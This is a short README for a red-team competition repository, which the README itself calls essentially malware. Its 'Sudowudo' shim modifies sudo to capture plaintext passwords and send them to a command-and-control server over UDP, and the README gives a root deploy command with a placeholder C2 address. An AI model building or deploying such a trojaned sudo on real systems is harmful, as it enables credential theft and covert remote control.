# Sudowudo 
## (And other various shims)

This repository is home to a few binary shims used for red team competitions. These scripts and tools are not intended to be used anywhere outside of blue/red team competitions as it's essentially malware.

Sudowudo takes advantage of tgetpass.c by stealing and exfiltrating the plaintext password before it's used, and sending it to a C2 server via a UDP datagram.

To deploy the shim on a device, run deploy as root and provide the IP of the C2 server and it's port. This will clone the OS specific version of sudo, add the shim, and then build it using make.

`sudo ./deploy XXX.XXX.XXX.XXX 1337`

## Requirements

